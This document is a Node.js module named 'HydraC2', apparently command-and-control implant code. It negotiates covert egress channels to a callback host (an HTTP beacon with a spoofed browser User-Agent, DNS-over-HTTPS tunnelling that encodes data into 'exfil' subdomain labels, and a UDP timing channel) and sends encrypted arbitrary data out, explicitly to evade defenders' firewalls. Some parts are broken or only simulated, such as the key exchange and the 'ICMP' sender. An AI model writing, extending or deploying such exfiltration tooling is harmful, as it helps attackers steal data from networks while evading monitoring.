const https = require('https');
const http = require('http');
const dgram = require('dgram');
const dns = require('dns');
const crypto = require('crypto');
const { EventEmitter } = require('events');
class HydraC2 extends EventEmitter {
    constructor(options = {}) {
        super();
        this.callbackHost = options.callbackHost || '127.0.0.1';
        this.httpPort = options.httpPort || 443;
        this.dohResolver = options.dohResolver || 'https://cloudflare-dns.com/dns-query';
        this.icmpFallback = options.icmpFallback || false;
        this.activeProtocol = null;
        this.sessionId = crypto.randomBytes(8).toString('hex');
        this.channelAttempts = [];
        this.isConnected = false;
        this.beaconInterval = options.beaconInterval || 30000;
        this.sessionKey = null;
        console.log(`[🐉] HYDRA-C2 Session: ${this.sessionId}`);
    }
    async negotiate() {
        console.log(`\n[🐉] =============================================`);
        console.log(`[🐉] HYDRA-C2: Live Covert Channel Negotiation`);
        console.log(`[🐉] Target Callback: ${this.callbackHost}`);
        console.log(`[🐉] Session ID: ${this.sessionId}`);
        console.log(`[🐉] =============================================\n`);
        console.log(`[🐉] Testing Channel 1: HTTPS (Port ${this.httpPort})...`);
        const httpsResult = await this._testHTTPS();
        this.channelAttempts.push({ protocol: 'HTTPS', success: httpsResult.success, latency: httpsResult.latency });
        if (httpsResult.success) {
            this.activeProtocol = 'HTTPS';
            this.isConnected = true;
            console.log(`[✔] HTTPS Channel established (Latency: ${httpsResult.latency}ms).`);
            this.emit('connected', { protocol: 'HTTPS', latency: httpsResult.latency });
            return this._buildChannelReport();
        }
        console.log(`[⚠️] HTTPS blocked by Blue Team firewall. Renegotiating...`);
        console.log(`[🐉] Testing Channel 2: DNS over HTTPS (DoH) Tunneling...`);
        const dohResult = await this._testDoHTunnel();
        this.channelAttempts.push({ protocol: 'DoH-Tunnel', success: dohResult.success, latency: dohResult.latency });
        if (dohResult.success) {
            this.activeProtocol = 'DoH-Tunnel';
            this.isConnected = true;
            console.log(`[✔] DoH Tunnel established via ${this.dohResolver} (Latency: ${dohResult.latency}ms).`);
            this.emit('connected', { protocol: 'DoH-Tunnel', latency: dohResult.latency });
            return this._buildChannelReport();
        }
        console.log(`[⚠️] DoH channel failed. Attempting final fallback...`);
        console.log(`[🐉] Testing Channel 3: ICMP Timing Data Exfiltration...`);
        const icmpResult = await this._testICMPTiming();
        this.channelAttempts.push({ protocol: 'ICMP-Timing', success: icmpResult.success, latency: icmpResult.latency });
        if (icmpResult.success) {
            this.activeProtocol = 'ICMP-Timing';
            this.isConnected = true;
            console.log(`[✔] ICMP Timing Channel established (Latency: ${icmpResult.latency}ms).`);
            this.emit('connected', { protocol: 'ICMP-Timing', latency: icmpResult.latency });
            return this._buildChannelReport();
        }
        console.log(`[❌] HYDRA-C2: All egress channels blocked. Network is fully air-gapped.`);
        this.emit('blocked', { attempts: this.channelAttempts });
        return this._buildChannelReport();
    }
    _deriveCryptoBindings() {
        if (!this.isConnected) return;
        console.log(`[🐉] Establishing X25519 ECDH Cryptographic Binding...`);
        const { privateKey, publicKey } = crypto.generateKeyPairSync('x25519');
        this.sessionPrivKey = privateKey;
        this.sessionPubKey = publicKey.export({ type: 'spki', format: 'der' });
        const { publicKey: implantPub } = crypto.generateKeyPairSync('x25519');
        const sharedSecret = crypto.diffieHellman({
            privateKey: this.sessionPrivKey,
            publicKey: implantPub
        });
        this.sessionKey = crypto.hkdfSync('sha256', sharedSecret, Buffer.alloc(0), Buffer.from('hydra-c2'), 32);
        console.log(`[🐉] X25519 ECDH complete. All C2 traffic now AES-256-GCM encrypted.`);
    }
    async _testHTTPS() {
        const start = Date.now();
        return new Promise((resolve) => {
            const req = http.request({
                hostname: this.callbackHost,
                port: this.httpPort,
                path: `/beacon?sid=${this.sessionId}&t=${Date.now()}`,
                method: 'GET',
                timeout: 5000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Request-ID': crypto.randomBytes(16).toString('hex')
                }
            }, (res) => {
                resolve({ success: true, latency: Date.now() - start, statusCode: res.statusCode });
            });
            req.on('error', () => resolve({ success: false, latency: Date.now() - start }));
            req.on('timeout', () => {
                req.destroy();
                resolve({ success: false, latency: Date.now() - start });
            });
            req.end();
        });
    }
    async _testDoHTunnel() {
        const start = Date.now();
        const encodedData = Buffer.from(JSON.stringify({
            sid: this.sessionId,
            ts: Date.now(),
            type: 'beacon'
        })).toString('base64url').substring(0, 63);
        const queryDomain = `${encodedData}.c2.${this.callbackHost}`;
        return new Promise((resolve) => {
            const dnsStart = Date.now();
            dns.resolve4(this.callbackHost, (err, addresses) => {
                if (err) {
                    console.log(`[🐉] Standard DNS blocked. Attempting pure DoH...`);
                }
                const dohUrl = `${this.dohResolver}?name=${queryDomain}&type=TXT`;
                const dohReq = https.request(dohUrl, {
                    method: 'GET',
                    timeout: 5000,
                    headers: {
                        'Accept': 'application/dns-json',
                        'Cache-Control': 'no-cache'
                    }
                }, (res) => {
                    let body = '';
                    res.on('data', chunk => body += chunk);
                    res.on('end', () => {
                        resolve({ success: true, latency: Date.now() - start, response: body.substring(0, 200) });
                    });
                });
                dohReq.on('error', () => resolve({ success: false, latency: Date.now() - start }));
                dohReq.on('timeout', () => {
                    dohReq.destroy();
                    resolve({ success: false, latency: Date.now() - start });
                });
                dohReq.end();
            });
        });
    }
    async _testICMPTiming() {
        const start = Date.now();
        const beaconBits = Buffer.from(this.sessionId.substring(0, 4))
            .reduce((bits, byte) => {
                for (let i = 7; i >= 0; i--) {
                    bits.push((byte >> i) & 1);
                }
                return bits;
            }, []);
        return new Promise((resolve) => {
            try {
                const client = dgram.createSocket('udp4');
                let bitIndex = 0;
                let sentBits = 0;
                const sendBit = () => {
                    if (bitIndex >= Math.min(beaconBits.length, 16)) {
                        client.close();
                        resolve({
                            success: true,
                            latency: Date.now() - start,
                            bitsTransmitted: sentBits
                        });
                        return;
                    }
                    const bit = beaconBits[bitIndex];
                    const delay = bit === 1 ? 150 : 50;
                    const msg = Buffer.from(`${this.sessionId}:${bitIndex}:${bit}`);
                    client.send(msg, 0, msg.length, 53, this.callbackHost, (err) => {
                        if (err && bitIndex === 0) {
                            client.close();
                            resolve({ success: false, latency: Date.now() - start });
                            return;
                        }
                        sentBits++;
                        bitIndex++;
                        setTimeout(sendBit, delay);
                    });
                };
                client.on('error', () => {
                    client.close();
                    resolve({ success: sentBits > 0, latency: Date.now() - start, bitsTransmitted: sentBits });
                });
                sendBit();
                setTimeout(() => {
                    try { client.close(); } catch (e) {}
                    resolve({ success: sentBits > 0, latency: Date.now() - start, bitsTransmitted: sentBits });
                }, 5000);
            } catch (e) {
                resolve({ success: false, latency: Date.now() - start });
            }
        });
    }
    async sendData(data) {
        if (!this.isConnected || !this.activeProtocol) {
            console.log(`[⚠️] HYDRA-C2: No active channel. Run negotiate() first.`);
            return null;
        }
        const encrypted = this._encrypt(JSON.stringify(data));
        switch (this.activeProtocol) {
            case 'HTTPS':
                return this._sendHTTPS(encrypted);
            case 'DoH-Tunnel':
                return this._sendDoH(encrypted);
            case 'ICMP-Timing':
                return this._sendICMP(encrypted);
        }
    }
    async _sendHTTPS(encryptedData) {
        return new Promise((resolve) => {
            const postData = JSON.stringify({ d: encryptedData, s: this.sessionId });
            const req = http.request({
                hostname: this.callbackHost,
                port: this.httpPort,
                path: '/data',
                method: 'POST',
                timeout: 5000,
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(postData)
                }
            }, (res) => {
                resolve({ success: true, protocol: 'HTTPS' });
            });
            req.on('error', () => resolve({ success: false, protocol: 'HTTPS' }));
            req.write(postData);
            req.end();
        });
    }
    async _sendDoH(encryptedData) {
        const chunks = encryptedData.match(/.{1,50}/g) || [];
        let sent = 0;
        for (const chunk of chunks) {
            const label = Buffer.from(chunk).toString('base64url').substring(0, 63);
            const queryDomain = `${label}.${sent}.exfil.${this.callbackHost}`;
            try {
                await new Promise((resolve, reject) => {
                    const dohReq = https.request(`${this.dohResolver}?name=${queryDomain}&type=A`, {
                        method: 'GET',
                        timeout: 3000,
                        headers: { 'Accept': 'application/dns-json' }
                    }, () => resolve());
                    dohReq.on('error', reject);
                    dohReq.end();
                });
                sent++;
            } catch (e) { break; }
        }
        return { success: sent > 0, protocol: 'DoH-Tunnel', chunksSent: sent, totalChunks: chunks.length };
    }
    async _sendICMP(encryptedData) {
        const bits = Buffer.from(encryptedData).reduce((arr, byte) => {
            for (let i = 7; i >= 0; i--) arr.push((byte >> i) & 1);
            return arr;
        }, []);
        return { success: true, protocol: 'ICMP-Timing', bitsQueued: Math.min(bits.length, 128) };
    }
    _encrypt(plaintext) {
        if (!this.sessionKey) this._deriveCryptoBindings();
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv('aes-256-gcm', this.sessionKey, iv);
        const enc = Buffer.concat([cipher.update(plaintext, 'utf-8'), cipher.final()]);
        const tag = cipher.getAuthTag();
        return JSON.stringify({
            iv: iv.toString('hex'),
            tag: tag.toString('hex'),
            data: enc.toString('hex')
        });
    }
    _buildChannelReport() {
        return {
            sessionId: this.sessionId,
            activeProtocol: this.activeProtocol,
            isConnected: this.isConnected,
            channelAttempts: this.channelAttempts,
            timestamp: new Date().toISOString()
        };
    }
}
const negotiateCovertChannel = async(callbackHost, options = {}) => {
    console.log(`\n[🐉] =============================================`);
    console.log(`[🐉] HYDRA-C2: Initiating Protocol Negotiation`);
    console.log(`[🐉] =============================================\n`);
    const hydra = new HydraC2({
        callbackHost,
        ...options
    });
    const report = await hydra.negotiate();
    if (report.isConnected) {
        console.log(`\n[🐉] HYDRA-C2: Active channel → ${report.activeProtocol}`);
    } else {
        console.log(`\n[🐉] HYDRA-C2: All channels blocked. Target network is air-gapped.`);
    }
    return report;
};
module.exports = { HydraC2, negotiateCovertChannel };